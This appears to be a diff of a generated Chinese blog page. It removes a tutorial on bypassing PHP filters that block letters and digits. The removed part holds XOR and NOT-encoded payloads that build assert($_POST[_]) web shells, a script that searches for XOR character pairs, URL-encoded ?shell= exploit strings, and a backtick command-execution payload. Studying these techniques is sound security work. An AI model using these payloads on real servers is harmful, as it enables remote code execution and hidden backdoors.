-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br><span class="line">我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=&gt;_ </span><br><span class="line">%B8^%FF=&gt;G</span><br><span class="line">%BA^%FF=&gt;E  </span><br><span class="line">%AB^%FF=&gt;T </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/phpinfo.png"></p>
-<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p>
-<p>直接看如何构造phpinfo()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%8F%96%E5%8F%8D.png" alt="取反"></p>
-<p>可以看出，自己对phpinfo取反，会产生一些不可见字符，可对phpinfo取反后再进行url编码。</p>
-<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%8F%96%E5%8F%8D1.png" alt="取反1"></p>
-<h3 id="构造assert字符"><a href="#构造assert字符" class="headerlink" title="构造assert字符"></a>构造assert字符</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$__=<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%8F%96%E5%8F%8D2.png" alt="取反2"></p>
-<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p><strong>脚本</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$result1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$result2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($num=<span class="number">0</span>;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($x=<span class="number">33</span>;$x&lt;<span class="number">126</span>;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>($y=<span class="number">33</span>;$y&lt;=<span class="number">126</span>;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    <span class="keyword">if</span>($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $result2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个脚本可以将“assert”变成两个字符串异或的结果，通过更改shell的值可以构造出我们想要的字符串。为了便于表示，生成字符串的范围为33-126（可见字符）。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line">$__ = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~&#123;&#96;&#123;|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/%E5%BC%82%E6%88%962.png" alt="异或2"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_ &#x3D; &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;</span><br><span class="line">$__ &#x3D; &quot;!+&#x2F;((&quot;^&quot;~&#123;&#96;&#123;|&quot;;  </span><br><span class="line">$___ &#x3D; $$__; </span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%BC%82%E6%88%967.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%BC%82%E6%88%966.png" alt="异或6"></p>
-<h4 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"></span><br><span class="line">$b = urlencode(~<span class="string">&#x27;_POST&#x27;</span>);</span><br><span class="line"><span class="comment">//%A0%AF%B0%AC%AB</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line">$__ = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___=$_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;$__=~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E5%8F%96%E5%8F%8D3.png" alt="取反3"></p>
-<h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了_</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>分析下这个Payload，?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/get.png" alt="get"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1968,7 +1968,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">60k</span>
+    <span title="站点总字数">61k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
